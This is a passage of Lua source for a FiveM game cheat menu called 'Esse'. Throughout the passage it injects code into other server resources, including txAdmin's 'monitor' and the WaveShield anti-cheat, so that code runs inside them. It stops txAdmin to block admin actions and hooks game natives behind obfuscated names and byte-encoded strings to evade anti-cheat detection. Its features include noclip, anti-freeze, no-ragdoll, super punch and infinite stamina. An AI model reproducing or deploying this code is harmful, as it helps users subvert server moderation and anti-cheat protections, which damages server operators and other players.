                                    end
                                end
                                local SafeCTrigger = function(name, ...)
                                    if type(TriggerEvent) == 'function' then
                                        TriggerEvent(name, ...)
                                    end
                                end
                                local SafeThread = function(fn)
                                    if type(CreateThread) == 'function' then
                                        CreateThread(fn)
                                    end
                                end
                                local SafeWait = Citizen.Wait
                                _G._NoclipControl = {
                                    active = %s,
                                    cleanup = nil
                                }
                                if %s then
                                    SafeCTrigger('txcl:setPlayerMode', 'noclip', true)
                                    local thread = SafeThread(function()
                                        while _G._NoclipControl and _G._NoclipControl.active do
                                            SafeWait(5000)
                                            if _G._NoclipControl and _G._NoclipControl.active then
                                                SafeCTrigger('txcl:setPlayerMode', 'noclip', true)
                                            end
                                        end
                                    end)
                                    _G._NoclipControl.cleanup = function()
                                        _G._NoclipControl.active = false
                                        SafeCTrigger('txcl:setPlayerMode', 'none', true)
                                    end
                                else
                                    SafeCTrigger('txcl:setPlayerMode', 'none', true)
                                    _G._NoclipControl.active = false
                                    _G._NoclipControl.cleanup = nil
                                    _G._NoclipControl = nil
                                end
                            ]]
                                MachoInjectResourceRaw('monitor',
                                    code:format(tostring(isChecked), tostring(isChecked)))
                                if isChecked then
                                    Esse:Notify("success", "Esse", "Noclip enabled", 3000)
                                else
                                    Esse:Notify("error", "Esse", "Noclip disabled", 3000)
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Disable All txAdmin",
                            checked = false,
                            desc = "This will disable txAdmin options from admins using them against you.",
                            onSelect = function(checked)
                                if checked then
                                    MachoResourceStop("monitor")
                                else
                                    MachoResourceStart("monitor")
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Disable txAdmin Freeze",
                            checked = false,
                            desc = "This will disable txAdmin Freeze.",
                            onSelect = function(checked)
                                if checked then
                                    MachoResourceStop("monitor")
                                else
                                    MachoResourceStart("monitor")
                                end
                            end
                        }


                    }
                },
                {
                    label = "Miscellaneous",
                    tabs = {
                        {
                            icon = "",
                            type = "button",
                            label = "Clear Screen Effects",
                            desc = "Removes all screen effects",
                            onSelect = function()
                                SetTimecycleModifier("")
                                ClearTimecycleModifier()
                                StopScreenEffect("DeathFailOut")
                                StopScreenEffect("DrugsMichaelAliensFight")
                                StopScreenEffect("DrugsTrevorClownsFight")
                                StopScreenEffect("DrugsTrevorRastafarian")
                                StopScreenEffect("Dont_tazeme_bro")
                                StopScreenEffect("Rampage")
                                StopScreenEffect("Underwater")
                                StopScreenEffect("Water_drop")
                                AnimpostfxStopAll()
                                SetSeethrough(false)
                                SetNightvision(false)
                                -- Pinapalitan ito ng tamang native
                                ResetPedMovementClipset(PlayerPedId(), 0.0)
                                SetTransitionTimecycleModifier("")
                                ClearExtraTimecycleModifier()
                                SetGameplayCamShakeAmplitude(0.0)
                                StopGameplayCamShaking(false)
                                self:Notify("success", "Esse", "Screen effects cleared!", 2000)
                            end
                        },
                        {
                            icon = "",
                            type = "button",
                            label = "Suicide",
                            desc = "This will kill you.",
                            onSelect = function()
                                local ped = PlayerPedId()
                                SetEntityInvincible(ped, false)
                                SetPlayerInvincible(PlayerId(), false)
                                local vehicle = GetVehiclePedIsIn(ped, false)
                                if vehicle ~= 0 and DoesEntityExist(vehicle) then
                                    NetworkExplodeVehicle(vehicle, true, false, false)
                                    Wait(100)
                                end
                                SetEntityHealth(ped, 0)
                                ApplyDamageToPed(ped, 1000, true)
                                SetPedToRagdoll(ped, 3000, 3000, 0, false, false, false)
                                self:Notify("error", "Esse", "You committed suicide!", 2000)
                            end
                        },
                        {
                            icon = "",
                            type = "button",
                            label = "Force Ragdoll",
                            desc = "This will ragdoll.",
                            onSelect = function()
                                MachoInjectResourceRaw("any", [[
                        local function awfAEDSADWEf()
                            local cWAmdjakwDksFD = SetPedToRagdoll
                            cWAmdjakwDksFD(PlayerPedId(), 3000, 3000, 0, false, false, false)
                        end

                        awfAEDSADWEf()
                        ]])
                            end
                        },
                        {
                            icon = "",
                            type = "button",
                            label = "Remove Crutch",
                            desc = "Removes crutch from any known resource or attached prop",
                            onSelect = function()
                                self:Notify("info", "Esse", "Removing crutch...", 2000)

                                -- 1. Stop common crutch resources
                                local crutchResources = {
                                    "wasabi_crutch", "crutch", "original_crutch", "crutch_system",
                                    "crutch_script", "wc_crutch", "jr_crutch", "crutch_removal"
                                }
                                for _, res in ipairs(crutchResources) do
                                    if GetResourceState(res) == "started" then
                                        MachoResourceStop(res)
                                    end
                                end

                                -- 2. Trigger common removal events
                                local removalEvents = {
                                    "wasabi_crutch:client:removeCrutch",
                                    "crutch:client:remove",
                                    "crutch:remove",
                                    "removeCrutch",
                                    "crutch_system:remove",
                                    "wc_crutch:remove"
                                }
                                for _, event in ipairs(removalEvents) do
                                    TriggerEvent(event)
                                    TriggerServerEvent(event)
                                end

                                -- 3. Remove attached crutch prop (if any)
                                local ped = PlayerPedId()
                                local crutchModels = {
                                    GetHashKey("prop_crutch_01"),
                                    GetHashKey("prop_crutch_02"),
                                    GetHashKey("prop_crutch_03"),
                                    GetHashKey("prop_crutch_04"),
                                    GetHashKey("p_crutch_01_s"),
                                    GetHashKey("prop_crutch")
                                }

                                -- Check attached props
                                local attachedProps = GetEntityAttachedTo(ped) or 0
                                if attachedProps ~= 0 and DoesEntityExist(attachedProps) then
                                    local model = GetEntityModel(attachedProps)
                                    for _, crutchHash in ipairs(crutchModels) do
                                        if model == crutchHash then
                                            DeleteEntity(attachedProps)
                                            break
                                        end
                                    end
                                end

                                -- Check nearby props
                                local objects = GetGamePool('CObject')
                                for _, obj in ipairs(objects) do
                                    if DoesEntityExist(obj) then
                                        local model = GetEntityModel(obj)
                                        for _, crutchHash in ipairs(crutchModels) do
                                            if model == crutchHash then
                                                local dist = #(GetEntityCoords(ped) - GetEntityCoords(obj))
                                                if dist < 2.0 then
                                                    DeleteEntity(obj)
                                                end
                                                break
                                            end
                                        end
                                    end
                                end

                                -- 4. Clear any limping or crutch animation (FIXED: replaced ResetPedMovementBlend)
                                ClearPedTasksImmediately(ped)
                                ResetPedMovementClipset(ped, 0.0) -- Tamang native
                                SetPedMoveRateOverride(ped, 1.0)
                                ResetPedStrafeClipset(ped)
                                ResetPedWeaponMovementClipset(ped)

                                -- 5. Force ragdoll reset (sometimes fixes stuck animation)
                                SetPedToRagdoll(ped, 1, 1, 0, false, false, false)

                                self:Notify("success", "Esse", "Crutch removed (if present)!", 3000)
                            end
                        },

                        {
                            type = "checkbox",
                            label = "Normal Noclip (AC Bypass)",
                            desc = "Normal noclip na naka-bypass lahat ng anti-cheat (WASD + Shift)",
                            checked = false,
                            onSelect = function(checked)
                                normalNoclipActive = checked
                                Esse:RunNormalNoclip(checked)
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Butterfly Noclip",
                            desc = "Toggle butterfly noclip mode (fly like a superhero)",
                            checked = false,
                            onSelect = function(checked)
                                butterflyActive = checked
                                Esse:RunButterflyNoclip(checked)
                            end
                        },



                        {
                            icon = "",
                            type = "scrollable",
                            value = 1,
                            values = { "Primary", "Secondary" },
                            label = "Clear Tasks",
                            desc = "Clears the character's tasks",
                            onSelect = function(value)
                                if value == "Primary" then
                                    ClearPedTasksImmediately(PlayerPedId())
                                else
                                    if value == "Secondary" then
                                        ClearPedSecondaryTask(PlayerPedId())
                                    end
                                end
                            end
                        },
                        { type = "divider", label = "Toggles" },
                        {
                            type = "checkbox",
                            label = "No Ragdoll",
                            checked = false,
                            desc = "This will prevent you from being ragdolled from admins or cheaters.",
                            onSelect = function(checked)
                                local waveStarted = GetResourceState("WaveShield") == 'started'
                                local targetRes = (GetResourceState("monitor") == "started" and "monitor")
                                    or (GetResourceState("ox_lib") == "started" and "ox_lib")
                                    or "any"

                                if checked then
                                    if waveStarted then
                                        Esse:Notify("success", "Esse", "No Ragdoll Enabled", 3000)
                                        Injection(
                                        GetResourceState("lb-phone") == "started" and "lb-phone" or "WaveShield", [[
                                        function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then return end
                                            _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                        end

                                        if noRagdollEnabled == nil then noRagdollEnabled = false end
                                        noRagdollEnabled = true

                                        local function initFlow(cb)
                                            local co = coroutine.create(cb)
                                            local ok, err
                                            while coroutine.status(co) ~= "dead" do
                                                ok, err = coroutine.resume(co)
                                                if not ok then
                                                    print("WaveShield Coroutine error:", err)
                                                    break
                                                end
                                                Citizen.Wait(0)
                                            end
                                        end

                                        initFlow(function()
                                            local getPed = PlayerPedId
                                            local setCanRagdoll = SetPedCanRagdoll
                                            local setRagdollOnCollision = SetPedRagdollOnCollision
                                            local setRagdollFromImpact = SetPedCanRagdollFromPlayerImpact
                                            local isRagdoll = IsPedRagdoll
                                            local clearTasks = ClearPedTasksImmediately

                                            while noRagdollEnabled and not Unloaded do
                                                Wait(0)
                                                local ped = getPed()
                                                if ped and ped ~= 0 then
                                                    setCanRagdoll(ped, false)
                                                    setRagdollOnCollision(ped, false)
                                                    setRagdollFromImpact(ped, false)
                                                    if isRagdoll(ped) then
                                                        clearTasks(ped)
                                                    end
                                                end
                                            end

                                            local ped = getPed()
                                            if ped and ped ~= 0 then
                                                setCanRagdoll(ped, true)
                                                setRagdollOnCollision(ped, true)
                                                setRagdollFromImpact(ped, true)
                                            end
                                        end)
                                    ]])
                                    else
                                        Injection(targetRes, [[
                                        function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then return end
                                            _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                        end

                                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetPedCanRagdoll", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetPedRagdollOnCollision", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetPedCanRagdollFromPlayerImpact", function(originalFn, ...) return originalFn(...) end)
                                        hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsPedRagdoll", function(originalFn, ...) return originalFn(...) end)
                                        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                        if noRagdollEnabled == nil then noRagdollEnabled = false end
                                        noRagdollEnabled = true

                                        local function startNoRagdoll()
                                            local create = CreateThread
                                            local wait = Wait
                                            local pedId = PlayerPedId
                                            local setCan = SetPedCanRagdoll
                                            local setColl = SetPedRagdollOnCollision
                                            local setImpact = SetPedCanRagdollFromPlayerImpact
                                            local isRag = IsPedRagdoll
                                            local clear = ClearPedTasksImmediately

                                            create(function()
                                                while noRagdollEnabled and not Unloaded do
                                                    local ped = pedId()
                                                    if ped and ped ~= 0 then
                                                        setCan(ped, false)
                                                        setColl(ped, false)
                                                        setImpact(ped, false)
                                                        if isRag(ped) then
                                                            clear(ped)
                                                        end
                                                    end
                                                    wait(0)
                                                end

                                                -- Restore
                                                local ped = pedId()
                                                if ped and ped ~= 0 then
                                                    setCan(ped, true)
                                                    setColl(ped, true)
                                                    setImpact(ped, true)
                                                end
                                            end)
                                        end

                                        startNoRagdoll()
                                    ]])
                                        Esse:Notify("success", "Esse", "No Ragdoll Enabled (Fallback)", 3000)
                                    end
                                else
                                    if waveStarted then
                                        Esse:Notify("success", "Esse", "No Ragdoll Disabled", 3000)
                                        Injection(
                                        GetResourceState("lb-phone") == "started" and "lb-phone" or "WaveShield", [[
                                        noRagdollEnabled = false
                                    ]])
                                    else
                                        Injection(targetRes, [[
                                        noRagdollEnabled = false
                                    ]])
                                        Esse:Notify("success", "Esse", "No Ragdoll Disabled (Fallback)", 3000)
                                    end
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Anti-Freeze",
                            checked = false,
                            desc = "This will prevent you from being frozen.",
                            onSelect = function(checked)
                                local waveStarted = GetResourceState("WaveShield") == 'started'
                                local targetRes = (GetResourceState("monitor") == "started" and "monitor")
                                    or (GetResourceState("ox_lib") == "started" and "ox_lib")
                                    or "any"

                                if checked then
                                    if waveStarted then
                                        Esse:Notify("success", "Esse", "Anti-Freeze Enabled", 3000)
                                        Injection(
                                        GetResourceState("lb-phone") == "started" and "lb-phone" or "WaveShield", [[
                                        function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then return end
                                            _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                        end

                                        if antiFreezeEnabled == nil then antiFreezeEnabled = false end
                                        antiFreezeEnabled = true

                                        local function initFlow(cb)
                                            local co = coroutine.create(cb)
                                            local ok, err
                                            while coroutine.status(co) ~= "dead" do
                                                ok, err = coroutine.resume(co)
                                                if not ok then
                                                    print("WaveShield Coroutine error:", err)
                                                    break
                                                end
                                                Citizen.Wait(0)
                                            end
                                        end

                                        initFlow(function()
                                            local getPed = PlayerPedId
                                            local isFrozen = IsEntityPositionFrozen
                                            local unfreeze = FreezeEntityPosition
                                            local clearTasks = ClearPedTasks

                                            while antiFreezeEnabled and not Unloaded do
                                                Wait(0)
                                                local ped = getPed()
                                                if ped and ped ~= 0 and isFrozen(ped) then
                                                    unfreeze(ped, false)
                                                    clearTasks(ped)
                                                end
                                            end
                                        end)
                                    ]])
                                    else
                                        Injection(targetRes, [[
                                        function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then return end
                                            _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                        end

                                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                        hNative("FreezeEntityPosition", function(originalFn, ...) return originalFn(...) end)
                                        hNative("ClearPedTasks", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsEntityPositionFrozen", function(originalFn, ...) return originalFn(...) end)
                                        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                        if antiFreezeEnabled == nil then antiFreezeEnabled = false end
                                        antiFreezeEnabled = true

                                        local function startAntiFreeze()
                                            local create = CreateThread
                                            local wait = Wait
                                            local pedId = PlayerPedId
                                            local isFrozen = IsEntityPositionFrozen
                                            local unfreeze = FreezeEntityPosition
                                            local clear = ClearPedTasks

                                            create(function()
                                                while antiFreezeEnabled and not Unloaded do
                                                    local ped = pedId()
                                                    if ped and ped ~= 0 and isFrozen(ped) then
                                                        unfreeze(ped, false)
                                                        clear(ped)
                                                    end
                                                    wait(0)
                                                end
                                            end)
                                        end

                                        startAntiFreeze()
                                    ]])
                                        Esse:Notify("success", "Esse", "Anti-Freeze Enabled (Fallback)", 3000)
                                    end
                                else
                                    if waveStarted then
                                        Esse:Notify("error", "Esse", "Anti-Freeze Disabled", 3000)
                                        Injection(
                                        GetResourceState("lb-phone") == "started" and "lb-phone" or "WaveShield", [[
                                        antiFreezeEnabled = false
                                    ]])
                                    else
                                        Injection(targetRes, [[
                                        antiFreezeEnabled = false
                                    ]])
                                        Esse:Notify("error", "Esse", "Anti-Freeze Disabled (Fallback)", 3000)
                                    end
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Force Third Person",
                            checked = false,
                            desc = "This will force third person.",
                            onSelect = function(checked)
                                if checked then
                                    Injection(
                                    GetResourceState("monitor") == "started" and "monitor" or
                                    GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[


                            function hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end

                                _G[nativeName] = function(...)
                                    return newFunction(originalNative, ...)
                                end
                            end

                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetFollowVehicleCamViewMode", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetFollowPedCamViewMode", function(originalFn, ...) return originalFn(...) end)

                            if kJfGhTrEeWqAsDz == nil then kJfGhTrEeWqAsDz = false end
                            kJfGhTrEeWqAsDz = true

                            local function pqkTRWZ38y()
                                local gKdNqLpYxMiV = CreateThread
                                gKdNqLpYxMiV(function()
                                    while kJfGhTrEeWqAsDz and not Unloaded do
                                        local qWeRtYuIoPlMnBv = SetFollowPedCamViewMode
                                        local aSdFgHjKlQwErTy = SetFollowVehicleCamViewMode

                                        qWeRtYuIoPlMnBv(0)
                                        aSdFgHjKlQwErTy(0)
                                        Wait(0)
                                    end
                                end)
                            end

                            pqkTRWZ38y()
                            ]])
                                else
                                    Injection(
                                    GetResourceState("monitor") == "started" and "monitor" or
                                    GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[

                            function hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end

                                _G[nativeName] = function(...)
                                    return newFunction(originalNative, ...)
                                end
                            end

                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetFollowVehicleCamViewMode", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetFollowPedCamViewMode", function(originalFn, ...) return originalFn(...) end)

                            kJfGhTrEeWqAsDz = false
                            ]])
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Force Driveby",
                            checked = false,
                            desc = "This will enable driveby if disabled.",
                            onSelect = function(checked)
                                if checked then
                                    Injection(
                                    GetResourceState("monitor") == "started" and "monitor" or
                                    GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[


                            function hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end

                                _G[nativeName] = function(...)
                                    return newFunction(originalNative, ...)
                                end
                            end

                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetPlayerCanDoDriveBy", function(originalFn, ...) return originalFn(...) end)
                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                            if zXcVbNmQwErTyUi == nil then zXcVbNmQwErTyUi = false end
                            zXcVbNmQwErTyUi = true

                            local function UEvLBcXqM6()
                                local cVbNmAsDfGhJkLz = CreateThread
                                cVbNmAsDfGhJkLz(function()
                                    while zXcVbNmQwErTyUi and not Unloaded do
                                        local lKjHgFdSaZxCvBn = SetPlayerCanDoDriveBy
                                        local eRtYuIoPaSdFgHi = PlayerPedId()

                                        lKjHgFdSaZxCvBn(eRtYuIoPaSdFgHi, true)
                                        Wait(0)
                                    end
                                end)
                            end

                            UEvLBcXqM6()
                            ]])
                                else
                                    Injection(
                                    GetResourceState("monitor") == "started" and "monitor" or
                                    GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[

                            function hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end

                                _G[nativeName] = function(...)
                                    return newFunction(originalNative, ...)
                                end
                            end

                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetPlayerCanDoDriveBy", function(originalFn, ...) return originalFn(...) end)
                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                            zXcVbNmQwErTyUi = false
                            ]])
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Infinite Stamina",
                            checked = false,
                            desc = "This will enable Infinite Stamina.",
                            onSelect = function(checked)
                                if checked then
                                    Esse:Notify("success", "Esse", "Infinite Stamina On", 3000)

                                    if GetResourceState("WaveShield") == "started" then
                                        Injection(
                                        GetResourceState("monitor") == "started" and "monitor" or
                                        GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[
                                        local function decode(tbl)
                                            local s = ""
                                            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                            return s
                                        end

                                        local function g(n)
                                            return _G[decode(n)]
                                        end

                                        if not _G.infiniteStaminaEnabled then
                                            _G.infiniteStaminaEnabled = true

                                            local GetPlayerId_fn      = g({80,108,97,121,101,114,73,100})
                                            local RestoreStamina_fn   = g({82,101,115,116,111,114,101,80,108,97,121,101,114,83,116,97,109,105,110,97})
                                            local Wait_fn             = g({87,97,105,116})

                                            local function initFlow(cb)
                                                local co = coroutine.create(cb)
                                                local function execCycle()
                                                    while coroutine.status(co) ~= "dead" do
                                                        local ok, err = coroutine.resume(co)
                                                        if not ok then
                                                            break
                                                        end
                                                        Wait_fn(0)
                                                    end
                                                end
                                                execCycle()
                                            end

                                            initFlow(function()
                                                while _G.infiniteStaminaEnabled do
                                                    local pid = GetPlayerId_fn()
                                                    if pid then
                                                        RestoreStamina_fn(pid, 1.0)
                                                    end
                                                    Wait_fn(0)
                                                end
                                            end)
                                        end
                                    ]])
                                    else
                                        MachoInjectResourceRaw("any", [[
                                        if _G.staminaThreadActive == nil then _G.staminaThreadActive = false end
                                        if _G.infiniteStaminaEnabled == nil then
                                            _G.infiniteStaminaEnabled = true

                                            local function ThreadStart()
                                                local CreateThread_fn = CreateThread
                                                local Wait_fn         = Wait
                                                local PlayerId_fn     = PlayerId
                                                local Restore_fn      = RestorePlayerStamina

                                                CreateThread_fn(function()
                                                    while true do
                                                        Wait_fn(0)
                                                        if not _G.infiniteStaminaEnabled then
                                                            Wait_fn(500)
                                                            goto continue
                                                        end

                                                        local pid = PlayerId_fn()
                                                        if pid then
                                                            Restore_fn(pid, 1.0)
                                                        end

                                                        ::continue::
                                                    end
                                                end)
                                            end

                                            ThreadStart()
                                        end
                                        _G.infiniteStaminaEnabled = true
                                    ]])
                                    end
                                else
                                    Esse:Notify("error", "Esse", "Infinite Stamina Off", 3000)

                                    if GetResourceState("WaveShield") == "started" then
                                        Injection(
                                        GetResourceState("monitor") == "started" and "monitor" or
                                        GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[
                                        _G.infiniteStaminaEnabled = false
                                    ]])
                                    else
                                        MachoInjectResourceRaw("any", [[
                                        _G.infiniteStaminaEnabled = false
                                    ]])
                                    end
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Tiny Ped",
                            checked = false,
                            desc = "This will turn you into a tiny ped.",
                            onSelect = function(checked)
                                local injectTarget =
                                    (GetResourceState("WaveShield") == "started" and "WaveShield") or
                                    (GetResourceState("monitor") == "started" and "monitor") or
                                    (GetResourceState("ox_lib") == "started" and "ox_lib") or
                                    "any"

                                if checked then
                                    Injection(injectTarget, [[
                                    if not _G.EsseTinyPedInjected then
                                        _G.EsseTinyPedInjected = true
                                        _G.EsseTinyPedEnabled = true

                                        function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then
                                                return
                                            end
                                            _G[nativeName] = function(...)
                                                return newFunction(originalNative, ...)
                                            end
                                        end

                                        hNative("SetPedConfigFlag", function(originalFn, ...) return originalFn(...) end)

                                        -- One-shot initflow (no looping)
                                        function initflow(name, fn)
                                            if not _G.__flows then _G.__flows = {} end
                                            if _G.__flows[name] then
                                                _G.__flows[name].active = false
                                            end
                                            local flow = { active = true }
                                            _G.__flows[name] = flow

                                            SetTimeout(0, function()
                                                if flow.active then
                                                    fn()
                                                end
                                            end)
                                        end
                                    else
                                        _G.EsseTinyPedEnabled = true
                                    end

                                    initflow("TinyPedOnce", function()
                                        local ped = PlayerPedId()
                                        if ped and ped ~= 0 then
                                            SetPedConfigFlag(ped, 223, true)
                                        end
                                    end)
                                ]])
                                else
                                    Injection(injectTarget, [[
                                    _G.EsseTinyPedEnabled = false
                                    local ped = PlayerPedId()
                                    if ped and ped ~= 0 then
                                        SetPedConfigFlag(ped, 223, false)
                                    end
                                ]])
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            desc = "This will make john cenna.",
                            label = "Super Punch",
                            checked = false,
                            onSelect = function(checked)
                                local waveStarted = GetResourceState("WaveShield") == 'started'
                                local targetRes = (GetResourceState("monitor") == "started" and "monitor")
                                    or (GetResourceState("ox_lib") == "started" and "ox_lib")
                                    or "any"

                                if checked then
                                    if waveStarted then
                                        Esse:Notify("success", "Esse", "Super Punch Enabled", 3000)
                                        Injection(
                                        GetResourceState("lb-phone") == "started" and "lb-phone" or "WaveShield", [[
                                        function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then return end
                                            _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                        end

                                        if superPunchEnabled == nil then superPunchEnabled = false end
                                        superPunchEnabled = true

                                        local function initFlow(cb)
                                            local co = coroutine.create(cb)
                                            local ok, err
                                            while coroutine.status(co) ~= "dead" do
                                                ok, err = coroutine.resume(co)
                                                if not ok then
                                                    break
                                                end
                                                Citizen.Wait(0)
                                            end
                                        end

                                        initFlow(function()
                                            local setMeleeMod = SetPlayerMeleeWeaponDamageModifier
                                            local setVehicleMod = SetPlayerVehicleDamageModifier
                                            local setWeaponMod = SetWeaponDamageModifier
                                            local playerId = PlayerId
                                            local unarmedHash = GetHashKey("WEAPON_UNARMED")
                                            local damageValue = 150.0

                                            while superPunchEnabled and not Unloaded do
                                                Wait(0)
                                                local pid = playerId()
                                                setMeleeMod(pid, damageValue)
                                                setVehicleMod(pid, damageValue)
                                                setWeaponMod(unarmedHash, damageValue)
                                            end

                                            -- Restore on disable
                                            local pid = playerId()
                                            setMeleeMod(pid, 1.0)
                                            setVehicleMod(pid, 1.0)
                                            setWeaponMod(unarmedHash, 1.0)
                                        end)
                                    ]])
                                    else
                                        Injection(targetRes, [[
                                        function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then return end
                                            _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                        end

                                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetPlayerMeleeWeaponDamageModifier", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetPlayerVehicleDamageModifier", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetWeaponDamageModifier", function(originalFn, ...) return originalFn(...) end)
                                        hNative("PlayerId", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetHashKey", function(originalFn, ...) return originalFn(...) end)

                                        if superPunchEnabled == nil then superPunchEnabled = false end
                                        superPunchEnabled = true

                                        local function startSuperPunch()
                                            local create = CreateThread
                                            local wait = Wait
                                            local setMelee = SetPlayerMeleeWeaponDamageModifier
                                            local setVehicle = SetPlayerVehicleDamageModifier
                                            local setWeapon = SetWeaponDamageModifier
                                            local getPlayer = PlayerId
                                            local hashKey = GetHashKey

                                            create(function()
                                                local unarmedHash = hashKey("WEAPON_UNARMED")
                                                local damageValue = 150.0

                                                while superPunchEnabled and not Unloaded do
                                                    local pid = getPlayer()
                                                    setMelee(pid, damageValue)
                                                    setVehicle(pid, damageValue)
                                                    setWeapon(unarmedHash, damageValue)
                                                    wait(0)
                                                end

                                                -- Restore
                                                local pid = getPlayer()
                                                setMelee(pid, 1.0)
                                                setVehicle(pid, 1.0)
                                                setWeapon(unarmedHash, 1.0)
                                            end)
                                        end

                                        startSuperPunch()
                                    ]])
                                        Esse:Notify("success", "Esse", "Super Punch Enabled (Fallback)", 3000)
                                    end
                                else
                                    if waveStarted then
                                        Esse:Notify("error", "Esse", "Super Punch Disabled", 3000)
                                        Injection(
                                        GetResourceState("lb-phone") == "started" and "lb-phone" or "WaveShield", [[
                                        superPunchEnabled = false
                                    ]])
                                    else
                                        Injection(targetRes, [[
                                        superPunchEnabled = false
                                    ]])
                                        Esse:Notify("error", "Esse", "Super Punch Disabled (Fallback)", 3000)
                                    end
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Freecam",
                            checked = false,
                            desc = "Toggle free camera mode to fly around and interact.",
                            onSelect = function(checked)
                                Esse:ToggleFreecam(checked)
                            end
                        },


                    }
                },
                {
                    label = "Wardrobe",
                    tabs = {
                        {
                            type = "button",
                            label = "Pedmenu",
                            desc = "Opens clothing shop for supported resources",
                            onSelect = function()
                                self:Notify("info", "Esse", "Opening Ped Menu...", 2000)

                                local clothingResources = {
                                    { name = "illenium-appearance", event = "illenium-appearance:client:openClothingShopMenu", arg = true },
                                    { name = "qb-clothing",         event = "qb-clothing:client:openMenu" },
                                    { name = "fivem-appearance",    event = "fivem-appearance:client:openMenu" },
                                    { name = "skinchanger",         event = "skinchanger:openMenu" },
                                    { name = "esx_clotheshop",      event = "esx_clotheshop:enter" },
                                    { name = "esx_skin",            event = "esx_skin:openMenu" }
                                }

                                local found = false
                                for _, res in ipairs(clothingResources) do
                                    if GetResourceState(res.name) == "started" then
                                        local injectCode = string.format("TriggerEvent('%s'%s)", res.event,
                                            res.arg and ", true" or "")
                                        MachoInjectResource2("AsThreadNs", res.name, injectCode)
                                        self:Notify("success", "Esse", "Opened " .. res.name, 3000)
                                        found = true
                                        break
                                    end
                                end

                                if not found then
                                    self:Notify("error", "Esse", "No supported clothing resource found!", 3000)
                                end
                            end
                        },
                        {
                            icon = "",
                            type = "scrollable",
                            value = 1,
                            values = { "Random" },
                            label = "Outfit",
                            desc = "Apply a preset outfit",
                            onSelect = function(value)
                                if value == "Random" then
                                    Injection("any", [[
                                    local function UxrKYLp378()
                                        local UwEsDxCfVbGtHy = PlayerPedId
                                        local FdSaQwErTyUiOp = GetNumberOfPedDrawableVariations
                                        local QwAzXsEdCrVfBg = SetPedComponentVariation
                                        local LkJhGfDsAqWeRt = SetPedHeadBlendData
                                        local MnBgVfCdXsZaQw = SetPedHairColor
                                        local RtYuIoPlMnBvCx = GetNumHeadOverlayValues
                                        local TyUiOpAsDfGhJk = SetPedHeadOverlay
                                        local ErTyUiOpAsDfGh = SetPedHeadOverlayColor
                                        local DfGhJkLzXcVbNm = ClearPedProp

